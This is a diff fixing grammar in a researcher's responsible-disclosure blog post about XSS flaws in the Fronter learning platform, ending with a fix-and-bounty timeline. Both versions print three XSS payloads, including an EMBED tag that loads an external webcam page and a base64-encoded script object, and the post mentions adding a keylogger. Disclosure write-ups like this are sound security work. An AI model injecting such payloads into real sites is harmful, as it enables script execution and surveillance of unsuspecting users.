@@ -19,18 +19,18 @@ I found lots of XSS vulnerabilities on Itslearning as you know, Fronter was the 
 
 [![fronter XSS](images/payload-3.jpg)](https://mustafakemalcan.com/wp-content/uploads/2018/04/payload-3.jpg)
 
-Our first payload is very typcial one; javascript:alert(1)
+Our first payload is a very typical one; javascript:alert(1)
 
-Second payload is powered by EMBED; <EMBED SRC="[https://mustafakemalcan.com/](https://t.co/pO3Wu3kLxh "https://mustafakemalcan.com/webcam.html") " width= 100% height= 100%></EMBED>
+The second payload is powered by EMBED; <EMBED SRC="[https://mustafakemalcan.com/](https://t.co/pO3Wu3kLxh "https://mustafakemalcan.com/webcam.html") " width= 100% height= 100%></EMBED>
 
-Last payload is more complicated than the other ones ; <object data="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=">
+The last payload is more complicated than the other ones ; <object data="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=">
 
-I can add keylogger and make webcam request like before that [stored XSS Itslearning vulnerability](https://mustafakemalcan.com/itslearning-xss-part-2/).
+I can add a keylogger and make webcam request like before that [stored XSS Itslearning vulnerability](https://mustafakemalcan.com/itslearning-xss-part-2/).
 
 UPDATE :
 
 02/04/2018 - I contacted to Fronter Team.
 
-12/04/2018 - Fronter closed vulnerabilities.
+12/04/2018 - Fronter closed the vulnerabilities.
 
 07/05/2018 - Fronter decided to give 1200$ bounty to me.
